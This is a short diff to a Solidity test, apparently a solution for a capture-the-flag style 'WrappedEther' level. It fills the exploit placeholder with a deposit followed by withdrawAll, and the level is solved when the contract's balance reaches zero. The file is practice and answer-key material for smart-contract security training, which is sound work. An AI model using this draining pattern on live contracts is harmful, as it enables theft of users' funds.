@@ -16,10 +16,11 @@ contract WrappedEtherTest is BaseTest {
     }
 
     function testExploitLevel() public {
-        /* YOUR EXPLOIT GOES HERE */
-
+        instance.deposit{value: 1 ether}(address(this));
+        instance.withdrawAll();
         checkSuccess();
     }
+    
 
     function checkSuccess() internal view override {
         assertTrue(address(instance).balance == 0, "Solution is not solving the level");
